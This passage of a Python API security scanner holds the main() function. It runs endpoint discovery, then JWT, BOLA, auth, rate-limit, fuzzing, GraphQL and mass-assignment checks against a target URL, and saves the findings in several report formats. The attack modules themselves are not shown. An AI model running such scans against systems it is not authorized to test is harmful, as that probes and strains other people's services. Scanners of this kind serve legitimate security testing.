    parser.add_argument("--full-scan",          action="store_true",  help="Run all modules")
    parser.add_argument("--discover-only",       action="store_true",  help="Only discover endpoints, no scanning")
    parser.add_argument("--no-discover",         action="store_true",  help="Skip discovery, scan the given URL directly")
    parser.add_argument("--requests",      type=int, default=30,       help="Burst size for rate limit test")
    parser.add_argument("--params",               default=None,        help="Params to fuzz e.g. q,id,search")
    parser.add_argument("--timeout",       type=int, default=12,       help="Request timeout seconds")
    parser.add_argument("--no-ssl-verify",        action="store_true", help="Disable SSL verification")
    parser.add_argument("--output",        "-o",  default=None,        help="Report output stem")
    parser.add_argument("--format",        "-f",  default="all",
                        choices=["html","json","csv","markdown","sarif","all"],
                        help="Report format (default: all)")
    parser.add_argument("--verbose",       "-v",  action="store_true", help="Verbose output")
    parser.add_argument("--threads",       type=int, default=20,       help="Discovery thread count")
    parser.add_argument("--scan-all",             action="store_true", help="Scan all discovered endpoints")

    args = parser.parse_args()
    banner()

    url         = args.url.rstrip("/")
    token       = args.token or ""
    auth_headers = build_auth_headers(token)
    params      = [p.strip() for p in args.params.split(",")] if args.params else []

    http = HTTPEngine(
        timeout    = args.timeout,
        verify_ssl = not args.no_ssl_verify,
    )

    print(f"  {C.BOLD}Target:{C.RESET}  {url}")
    if token:
        print(f"  {C.BOLD}Token:{C.RESET}   {token[:40]}...")
    print()

    t_start      = time.time()
    all_findings = []
    discovered   = None

    # ── DISCOVERY ─────────────────────────────────────────────────
    parsed = urlparse(url)
    is_direct_api = (
        args.no_discover or
        any(p in parsed.path for p in ["/api","/v1","/v2","/graphql","/gql"]) or
        parsed.path.count("/") >= 2
    )

    if not is_direct_api:
        disc = Discoverer(http, url, auth_headers, verbose=args.verbose)
        disc._lock = threading.Lock() if not hasattr(disc,"_lock") else disc._lock
        discovered = disc.discover()

        if args.discover_only:
            duration = time.time() - t_start
            print(f"\n  {C.GREEN}Discovery complete in {duration:.1f}s{C.RESET}")
            print(f"  Total requests made: {http.request_count}")
            return

        scan_targets = [url]
        if args.scan_all:
            scan_targets = list(set([url] + discovered["all"]))[:20]
        else:
            # Smart target selection — most interesting endpoints
            scan_targets = [url]
            if discovered["graphql"]:
                scan_targets += discovered["graphql"][:2]
            if discovered["auth"]:
                scan_targets += discovered["auth"][:2]
            scan_targets += discovered["apis"][:5]
            scan_targets = list(dict.fromkeys(scan_targets))[:10]
    else:
        scan_targets = [url]
        print(f"  {C.DIM}Direct API URL detected — skipping discovery{C.RESET}\n")

    # ── MODULE SELECTION ──────────────────────────────────────────
    modules = args.module if args.module else []
    if args.full_scan or not modules:
        modules = ["jwt","bola","auth","headers","ratelimit",
                   "sensitive","fuzz","graphql","mass-assignment"]

    print(f"\n  {C.BOLD}Modules:{C.RESET} {', '.join(modules)}")
    print(f"  {C.BOLD}Targets:{C.RESET} {len(scan_targets)} endpoint(s)\n")

    # ── SCAN ──────────────────────────────────────────────────────
    graphql_urls = (discovered["graphql"] if discovered else [])

    for scan_url in scan_targets:
        print(f"  {C.CYAN}Scanning: {scan_url}{C.RESET}")

        module_fns = {
            "jwt":            lambda u=scan_url: scan_jwt(http, u, token, auth_headers, args.timeout),
            "bola":           lambda u=scan_url: scan_bola(http, u, auth_headers),
            "auth":           lambda u=scan_url: scan_auth(http, u, auth_headers, token),
            "headers":        lambda u=scan_url: scan_headers(http, u, auth_headers),
            "ratelimit":      lambda u=scan_url: scan_ratelimit(http, u, auth_headers, args.requests),
            "sensitive":      lambda u=scan_url: scan_sensitive(http, u, auth_headers),
            "fuzz":           lambda u=scan_url: scan_fuzz(http, u, auth_headers, params),
            "mass-assignment":lambda u=scan_url: scan_mass_assignment(http, u, auth_headers),
            "graphql":        lambda u=scan_url: (
                scan_graphql(http, u, auth_headers)
                if any(p in u for p in ["/graphql","/gql","/query"])
                else []
            ),
        }

        for mod in modules:
            t0 = time.time()
            try:
                findings = module_fns[mod]()
                elapsed  = time.time() - t0
                crit = sum(1 for f in findings if f.severity==Severity.CRITICAL)
                high = sum(1 for f in findings if f.severity==Severity.HIGH)
                status = (f"{C.RED}[{crit} CRITICAL]{C.RESET} " if crit else "") + \
                         (f"{C.ORANGE}[{high} HIGH]{C.RESET}" if high else "")
                print(f"    {C.DIM}[{mod:15s}]{C.RESET} "
                      f"{len(findings):3d} finding(s) in {elapsed:.1f}s  {status}")
                if not args.verbose:
                    for f in findings:
                        if f.severity in (Severity.CRITICAL, Severity.HIGH):
                            print_finding(f)
                else:
                    for f in findings:
                        print_finding(f)
                all_findings += findings
            except Exception as e:
                print(f"    {C.DIM}[{mod:15s}]{C.RESET} {C.RED}error: {e}{C.RESET}")

    # Also scan GraphQL endpoints specifically
    if "graphql" in modules:
        for gql_url in graphql_urls:
            if gql_url not in scan_targets:
                print(f"  {C.PURPLE}GraphQL: {gql_url}{C.RESET}")
                gql_findings = scan_graphql(http, gql_url, auth_headers)
                crit = sum(1 for f in gql_findings if f.severity==Severity.CRITICAL)
                high = sum(1 for f in gql_findings if f.severity==Severity.HIGH)
                print(f"    {C.DIM}[graphql        ]{C.RESET} "
                      f"{len(gql_findings):3d} finding(s) "
                      f"{C.RED}[{crit} CRITICAL]{C.RESET} {C.ORANGE}[{high} HIGH]{C.RESET}")
                for f in gql_findings:
                    if f.severity in (Severity.CRITICAL,Severity.HIGH):
                        print_finding(f)
                all_findings += gql_findings

    duration = time.time() - t_start
    print_summary(all_findings, duration, url, discovered)

    # ── REPORTS ───────────────────────────────────────────────────
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    stem = args.output or f"api_scan_{ts}"

    fmts = (["html","json","csv","markdown","sarif"]
            if args.format == "all" else [args.format])
    saved = []
    for fmt in fmts:
        path = Path(f"{stem}.{fmt}")
        if fmt == "html":
            path.write_text(build_html(all_findings, url, duration,
                                       http.request_count, discovered),
                            encoding="utf-8")
        elif fmt == "json":
            data = {
                "target":    url,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "duration":  round(duration,2),
                "requests":  http.request_count,
                "discovery": {k:[str(e) for e in v] for k,v in (discovered or {}).items()},
                "summary":   {s.value: sum(1 for f in all_findings if f.severity==s)
                              for s in Severity},
                "findings":  [f.to_dict() for f in
                              sorted(all_findings, key=lambda x: SEV_ORDER[x.severity])],
            }
            path.write_text(json.dumps(data,indent=2), encoding="utf-8")
        elif fmt == "csv":
            path.write_text(build_csv(all_findings), encoding="utf-8")
        elif fmt == "markdown":
            path.write_text(build_markdown(all_findings,url,duration), encoding="utf-8")
        elif fmt == "sarif":
            path.write_text(build_sarif(all_findings,url), encoding="utf-8")
        saved.append(str(path))

    if saved:
        print(f"  {C.GREEN}Reports saved:{C.RESET}")
        for p in saved:
            print(f"    → {p}")
        print()

    print(f"  {C.DIM}Total HTTP requests: {http.request_count}{C.RESET}\n")

    crit_high = sum(1 for f in all_findings
                    if f.severity in (Severity.CRITICAL,Severity.HIGH))
    sys.exit(1 if crit_high > 0 else 0)


if __name__ == "__main__":
    main()
